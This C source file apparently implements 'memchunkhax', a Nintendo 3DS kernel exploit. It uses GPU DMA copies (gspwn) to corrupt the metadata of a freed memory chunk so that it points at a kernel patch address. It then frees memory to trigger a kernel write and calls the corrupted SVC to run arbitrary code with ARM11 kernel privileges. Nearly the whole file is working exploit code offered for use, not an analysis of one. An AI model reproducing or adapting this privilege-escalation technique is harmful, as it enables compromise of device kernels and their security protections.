#include "memchunkhax.h"

#include <stddef.h>
#include <stdint.h>
#include "firmcompat.h"
#include "appcompat.h"
#include "arm11_tools.h"

static void gspwn_copy(void *dest, void *src, uint32_t length, int check, int check_offset)
{
    // We'll use some memory to check the copy is being done right.
    void *check_mem = (void *)APP_CHECK_MEM;
    int *check_loc = (int *)(check_mem + check_offset);

    while(*check_loc != check) {
        memcpy32(check_mem, check_mem, 0x10000);
        app->GSPGPU_FlushDataCache(src, length);

        uint32_t arr1[] = {4, (uint32_t)src, (uint32_t)dest, length,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr1);

        app->GSPGPU_FlushDataCache(check_mem, 0x10);

        uint32_t arr2[] = {4, (uint32_t)dest, (uint32_t)check_mem, 0x10,
                           0xFFFFFFFF, 0xFFFFFFFF, 8, 0};
        app->nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue((void *)app->gpuHandle, arr2);

        memcpy32(check_mem, check_mem, 0x10000);
    }
}

#if defined(ENTRY_MSET)
static void build_nop_slide(uint32_t *dest, unsigned int len)
{
    unsigned int i;
    for (i = 0; i < len; i++) {
        dest[i] = 0xE1A00000;  // ARM instruction: nop
    }
    dest[i - 1] = 0xE12FFF1E;  // ARM instruction: bx lr
}
#endif

static int svcControlMemory(void **out, void *p1, void *p2, size_t n,
	unsigned int op, unsigned int perm)
{
	register unsigned int r0 __asm__("r0");
	register void *r1 __asm__("r1");
	register void *r2 __asm__("r2");
	register size_t r3 __asm__("r3");
	register unsigned int r4 __asm__("r4");

	register int res __asm__("r0");
	register void *resOut __asm__("r1");

	r0 = op;
	r1 = p1;
	r2 = p2;
	r3 = n;
	r4 = perm;
	__asm__ volatile ("svc 1" : "=r"(res), "=r"(resOut)
		: "r"(r0), "r"(r1), "r"(r2), "r"(r3), "r"(r4));

	if (out != NULL)
		*out = resOut;

	return res;
}

void __attribute__((noreturn)) memchunk_arm11hax(void (*func)())
{
    register void (* r0)() __asm__("r0");

    // I need some memory locations to use
    uint32_t *mem_hax_mem = (uint32_t *)APP_MEM_HAX_MEM;
    uint32_t *mem_hax_mem_free = (uint32_t *)((uint32_t)mem_hax_mem + 0x1000);

    // There's not much documentation on this code.
    // I've never studied the logic of it, so I can't describe it in more detail.

    // Free some random chunk of memory
    svcControlMemory(NULL, mem_hax_mem_free, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    // arm11_buffer is the location that is copied *from* when using gspwn_copy
    uint32_t *arm11_buffer = (uint32_t *)APP_ARM11_BUFFER;
    arm11_buffer[0] = 1;
    arm11_buffer[1] = fw->kernel_patch_address;
    arm11_buffer[2] = 0;
    arm11_buffer[3] = 0;

    // Copy the arm11_buffer to the freed memory with gspwn
    gspwn_copy(mem_hax_mem_free, arm11_buffer, 0x10, fw->kernel_patch_address, 4);

    // Trigger kernel write
    svcControlMemory(NULL, mem_hax_mem, NULL, 0x1000, 1 /* MEMOP_FREE */, 0);

    while (1) {
        // Call the corrupted SVC
        r0 = func;
        __asm__ volatile ("svc 8" : "+r"(r0) :: "r1");
    }
}
